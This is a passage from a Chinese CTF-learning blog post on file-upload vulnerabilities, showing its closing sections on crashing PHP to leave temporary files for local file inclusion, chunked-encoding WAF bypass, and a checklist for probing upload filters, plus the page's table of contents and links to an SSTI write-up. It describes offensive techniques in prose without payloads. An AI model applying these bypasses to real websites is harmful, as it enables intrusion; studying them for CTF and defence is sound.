<li>向 PHP 发送超大文件或构造特定 Payload 让 PHP 进程崩溃（Segfault）。</li>
<li>PHP 在处理上传时会生成 <code>/tmp/phpXXXXXX</code> 临时文件。</li>
<li>正常情况下脚本执行完会删除临时文件，但如果进程崩溃，临时文件会残留。</li>
<li>结合 LFI 包含该临时文件（需要爆破文件名，或利用 Windows 下的 <code>FindFirstFile</code> 特性）。</li>
</ul>
</li>
</ul>
<h4 id="8-“Chunked”-传输绕过-WAF"><a href="#8-“Chunked”-传输绕过-WAF" class="headerlink" title="8.  “Chunked” 传输绕过 WAF"></a>8.  “Chunked” 传输绕过 WAF</h4><ul>
<li><strong>原理</strong>：许多 WAF 无法解析 HTTP 协议的 <code>Transfer-Encoding: chunked</code>。</li>
<li><strong>利用</strong>：在 Burp Suite 中将请求体分块发送，WAF 看到的可能是碎片的关键词，而后端 Web Server 会将其重组。</li>
</ul>
<hr>
<h3 id="总结学习建议"><a href="#总结学习建议" class="headerlink" title="总结学习建议"></a>总结学习建议</h3><p>在做 CTF 题时，建议按照以下流程思考：</p>
<ol>
<li><strong>探测环境</strong>：Server 是什么（Nginx&#x2F;Apache&#x2F;IIS）？OS 是什么（Win&#x2F;Linux）？PHP 版本？</li>
<li><strong>黑白名单测试</strong>：Fuzzing 后缀名，测试 <code>php5</code>, <code>phtml</code>, <code>pHp</code> 等。</li>
<li><strong>检查内容过滤</strong>：尝试上传包含 <code>&lt;?php</code> 的纯文本，看是否报错或被拦截。</li>
<li><strong>寻找配置文件</strong>：能否上传 <code>.htaccess</code> 或 <code>.user.ini</code>？</li>
<li><strong>组合拳</strong>：<ul>
<li>上传+文件包含。</li>
<li>上传+解析漏洞。</li>
<li>上传+竞争。</li>
</ul>
</li>
</ol>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Lyifan</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/11/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">http://example.com/2025/11/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">Fan's Blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/%E5%A4%B4%E5%83%8F.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/12/22/Renderme-wp/" title="Renderme_wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Renderme_wp</div></div><div class="info-2"><div class="info-item-1">RenderMe -ThinkPHP 8 SSTI 到 RCE 再 Privilege Escalation题目信息 题目名称: RenderMe 题目描述: “I wrote a simple page to render your name.” 难度: 中等偏难 考点: SSTI (服务端模板注入) → RCE (远程代码执行) → 权限提升   Part 1: SSTI 漏洞分析与利用一、什么是 SSTI 漏洞？1.1 SSTI 概念SSTI (Server-Side Template Injection，服务端模板注入) 是一种注入漏洞，发生在用户输入被不安全地嵌入到服务端模板中时。 现代 Web 应用通常使用模板引擎来动态生成 HTML 页面。模板引擎允许开发者在 HTML 中嵌入特殊语法，这些语法会在服务端被解析执行。 正常的模板使用方式： 123// 安全：变量通过参数传递，会被自动转义$template = &quot;Hello, &#123;$name&#125;&quot;;View::display($template, [&#x27;name&#x27;...</div></div></div></a><a class="pagination-related" href="/2025/11/27/hello-world/" title="Hello World"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Hello World</div></div><div class="info-2"><div class="info-item-1">Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot;  More info: Writing Run server1$ hexo server  More info: Server Generate static files1$ hexo generate  More info: Generating Deploy to remote sites1$ hexo deploy  More info: Deployment </div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/%E5%A4%B4%E5%83%8F.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Lyifan</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Lyi-Fan"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">博客建设中，欢迎提出宝贵意见！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86%EF%BC%9A%E5%9F%BA%E7%A1%80%E4%B8%8E%E7%BB%8F%E5%85%B8%E7%BB%95%E8%BF%87-The-Classics"><span class="toc-number">1.</span> <span class="toc-text">第一部分：基础与经典绕过 (The Classics)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.</span> <span class="toc-text">1. 前端验证绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-MIME-Type-%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.</span> <span class="toc-text">2. MIME-Type 验证绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%90%8E%E7%BC%80%E5%90%8D%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.</span> <span class="toc-text">3. 后缀名黑名单绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%90%8E%E7%BC%80%E5%90%8D%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.</span> <span class="toc-text">4. 后缀名白名单绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86%EF%BC%9A%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE%E4%B8%8E%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-Core-Mechanics"><span class="toc-number">2.</span> <span class="toc-text">第二部分：服务器配置与解析漏洞 (Core Mechanics)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Apache-htaccess-%E6%94%BB%E5%87%BB"><span class="toc-number">2.1.</span> <span class="toc-text">1. Apache .htaccess 攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-user-ini-%E6%94%BB%E5%87%BB-%E8%BF%91%E5%B9%B4-CTF-%E9%AB%98%E9%A2%91"><span class="toc-number">2.2.</span> <span class="toc-text">2. .user.ini 攻击 (近年 CTF 高频)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-Nginx-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">2.3.</span> <span class="toc-text">3. Nginx 解析漏洞 (配置错误)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-Apache-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-%E6%97%A7%E7%89%88%E6%9C%AC-%E7%89%B9%E5%AE%9A%E9%85%8D%E7%BD%AE"><span class="toc-number">2.4.</span> <span class="toc-text">4. Apache 解析漏洞 (旧版本&#x2F;特定配置)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86%EF%BC%9A%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%E4%B8%8E-WAF-%E7%BB%95%E8%BF%87-Advanced-Bypass"><span class="toc-number">3.</span> <span class="toc-text">第三部分：内容检测与 WAF 绕过 (Advanced Bypass)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%A0%87%E7%AD%BE%E4%B8%8E%E4%BB%A3%E7%A0%81%E9%A3%8E%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.</span> <span class="toc-text">1. 标签与代码风格绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%96%87%E4%BB%B6%E5%A4%B4-Magic-Bytes-%E4%BC%AA%E9%80%A0"><span class="toc-number">3.2.</span> <span class="toc-text">2. 文件头 (Magic Bytes) 伪造</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93-Secondary-Rendering-%E7%BB%95%E8%BF%87"><span class="toc-number">3.3.</span> <span class="toc-text">3. 二次渲染 (Secondary Rendering) 绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4"><span class="toc-number">3.4.</span> <span class="toc-text">4. &lt;? 起始符过滤绕过 (Base64&#x2F;Encoding)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E9%83%A8%E5%88%86%EF%BC%9A%E8%BF%91%E5%B9%B4%E9%AB%98%E9%98%B6-Trick-%E4%B8%8E%E6%96%B0%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">4.</span> <span class="toc-text">第四部分：近年高阶 Trick 与新利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%AB%9E%E4%BA%89%E4%B8%8A%E4%BC%A0-Race-Condition"><span class="toc-number">4.1.</span> <span class="toc-text">1. 竞争上传 (Race Condition)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%BB%93%E5%90%88-phar-%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">4.2.</span> <span class="toc-text">2. 结合 phar:&#x2F;&#x2F; 协议的反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-ImageMagick-%E6%BC%8F%E6%B4%9E-CVE-%E5%8E%86%E5%8F%B2%E9%81%97%E7%95%99%E4%B8%8E%E5%8F%98%E7%A7%8D"><span class="toc-number">4.3.</span> <span class="toc-text">3. ImageMagick 漏洞 (CVE 历史遗留与变种)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-iconv-%E8%BD%AC%E7%A0%81%E6%94%BB%E5%87%BB-WAF-Bypass"><span class="toc-number">4.4.</span> <span class="toc-text">4. iconv 转码攻击 (WAF Bypass)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E5%88%A9%E7%94%A8-LD-PRELOAD-%E7%BB%95%E8%BF%87-disable-functions"><span class="toc-number">4.5.</span> <span class="toc-text">5. 利用 LD_PRELOAD 绕过 disable_functions</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-ZIP-TAR-%E8%BD%AF%E9%93%BE%E6%8E%A5%E6%94%BB%E5%87%BB-Symlink-Zip-Slip"><span class="toc-number">4.6.</span> <span class="toc-text">6. ZIP&#x2F;TAR 软链接攻击 (Symlink &#x2F; Zip Slip)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-PHP-7-8-Segment-Fault-%E5%B4%A9%E6%BA%83-%E7%94%9F%E6%88%90%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="toc-number">4.7.</span> <span class="toc-text">7. PHP 7&#x2F;8 Segment Fault (崩溃) 生成临时文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-%E2%80%9CChunked%E2%80%9D-%E4%BC%A0%E8%BE%93%E7%BB%95%E8%BF%87-WAF"><span class="toc-number">4.8.</span> <span class="toc-text">8.  “Chunked” 传输绕过 WAF</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E5%AD%A6%E4%B9%A0%E5%BB%BA%E8%AE%AE"><span class="toc-number">5.</span> <span class="toc-text">总结学习建议</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/23/SSTI%E7%9A%84%E5%85%A8%E9%9D%A2fuzz/" title="SSTI的全面fuzz">SSTI的全面fuzz</a><time datetime="2025-12-23T07:11:21.000Z" title="发表于 2025-12-23 15:11:21">2025-12-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/22/Renderme-wp/" title="Renderme_wp">Renderme_wp</a><time datetime="2025-12-22T08:18:21.000Z" title="发表于 2025-12-22 16:18:21">2025-12-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" title="文件上传漏洞">文件上传漏洞</a><time datetime="2025-11-29T01:16:52.000Z" title="发表于 2025-11-29 09:16:52">2025-11-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/27/hello-world/" title="Hello World">Hello World</a><time datetime="2025-11-27T14:08:36.522Z" title="发表于 2025-11-27 22:08:36">2025-11-27</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By Lyifan</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><div class="js-pjax"></div><script async data-pjax src="/"></script></div></body></html>